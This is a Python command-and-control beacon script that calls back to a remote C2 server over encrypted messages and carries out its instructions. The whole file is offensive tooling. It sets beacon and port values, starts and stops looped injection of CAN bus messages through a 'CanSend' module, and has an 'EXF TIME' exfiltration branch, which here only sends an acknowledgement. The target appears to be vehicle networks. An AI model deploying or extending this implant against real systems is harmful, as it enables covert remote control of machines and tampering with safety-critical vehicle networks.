#!/usr/bin/python3

from termcolor import colored
from cansend import CanSend
from sneakysend import SneakySend
from pathlib import Path
import time
import json
import threading
import argparse
import os

config = {
    'initialized' : False,
    'remote_comm_port' : -1,
    'remote_init_port' : 2023,
    'remote_address' : '127.0.0.1',
    'bind_address' : '0.0.0.0',
    'listen_port' : 4000,
    # Also used for init interval
    'beacon_timeout' : 10
}

p = Path(Path(__file__).resolve().parents[0], 'sym.key')

ss = SneakySend(p, config['bind_address'], config['listen_port'])
cs = CanSend()

running_commands = []

def init_request():
    
    request_data = json.dumps({
        "message" : "INIT?",
        "data" : "NONE"
    })

    while not config['initialized']:
        print(f'[c2] Sending initialization request {config["beacon_timeout"]}s')
        ss.send_encrypted_message(request_data, config['remote_address'], config['remote_init_port'])
        response = ss.receive_encrypted_message(config['beacon_timeout'])
        
        if(response):
            try:
                js = json.loads(response)
                
                print(f'[c2] Message: {js["message"]} Data: {js["data"]}')
                if(js['message'] == 'INIT'):
                    print(colored(f'[c2] Beacon Initialized', 'green'))
                    config['initialized'] = True
                    return
            except Exception as e:
                print(f'[c2] {e}')

def wait_for_command():
    print(f'[c2] Listening for instructions...')
    while True:
        result = ss.receive_encrypted_message(10)

        if(result):
            print(colored(f'[c2] Received Instruction!', 'green'))
            parse_command(result)

def parse_command(data):
    try:
        # Don't question it
        js = json.loads(json.loads(json.dumps(data)))
        #print(type(js))
        #print(js)
        print(colored(f"[c2] Message: {js['message']} Data: {js['data']}", 'magenta'))

        if(js['message'] == 'BEACON SET'):
            config['beacon_timeout'] = int(js['data'])
            request_data = json.dumps({
                "message" : "ACK",
                "data" : (f"BEACON TIME {js['data']}")
            })
            time.sleep(1)
            ss.send_encrypted_message(request_data, config['remote_address'], config['remote_comm_port'])
        
        elif(js['message'] == 'PORT SET'):
            config['remote_comm_port'] = int(js['data'])
            request_data = json.dumps({
                "message" : "ACK",
                "data" : (f"REPLY TO {js['data']}")
            })
            time.sleep(1)
            ss.send_encrypted_message(request_data, config['remote_address'], config['remote_comm_port'])

        elif(js['message'] == 'LOOP COMM'):
            # Converts string to list in the worst way possible
            test = js['data'].strip('][').replace("'", '').split(', ')
            #print(f'check {test}')

            if('start' in test):
                #print('made it here')
                command_id = time.time()
                running_commands.append(command_id)
                cs.canLoop(test, command_id)
            else:
                # HARD CODED TO FIRST COMMAND FOR NOW
                cs.canLoop(test, running_commands[0])

            can_response = 'LOOP START/STOP MESSAGE'
            request_data = json.dumps({
                "message" : "ACK",
                "data" : can_response
            })
            time.sleep(1)

            ss.send_encrypted_message(request_data, config['remote_address'], config['remote_comm_port'])

        elif(js['message'] == 'EXEC COMM'):
            test = js['data']
            can_response = 'SINGLE CAN EXECUTE'
            request_data = json.dumps({
                "message" : "ACK",
                "data" : can_response
            })
            time.sleep(1)
            ss.send_encrypted_message(request_data, config['remote_address'], config['remote_comm_port'])

        elif(js['message'] == 'EXF TIME'):
            test = js['data']
            can_response = 'exfiltrating data'
            request_data = json.dumps({
                "message" : "ACK",
                "data" : can_response
            })
            time.sleep(1)

            ss.send_encrypted_message(request_data, config['remote_address'], config['remote_comm_port'])


    except Exception as e:
        print(colored(f'[c2] {e}', 'yellow'))
        return
    return


if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()

    parser.add_argument('--ip', type=str, required=False, help='Remote IP of C2 server (default 127.0.0.1)')
    parser.add_argument('--port', type=int, required=False, help='Initialization port of C2 server (default 2023)')
    parser.add_argument('--lport', type=int, required=False, help='Local listening port (default 4000)')
    parser.add_argument('--bind', type=str, required=False, help='Local listen interface (default 0.0.0.0)')
    
    args = parser.parse_args()
    if(args.ip):
        print(colored(f'[c2] INIT setting ip to {args.ip}', 'blue'))
        config['remote_address'] = args.ip
    if(args.port):
        print(colored(f'[c2] INIT setting init port to {args.port}', 'blue'))
        config['remote_init_port'] = args.port
    if(args.lport):
        print(colored(f'[c2] INIT setting listining port to {args.lport}', 'blue'))
        config['listen_port'] = args.lport
    if(args.bind):
        print(colored(f'[c2] INIT setting bind interface to {args.bind}', 'blue'))
    
    # Initialize can interfaces using cs instance of cansend clas
    init_request()
    wait_for_command()
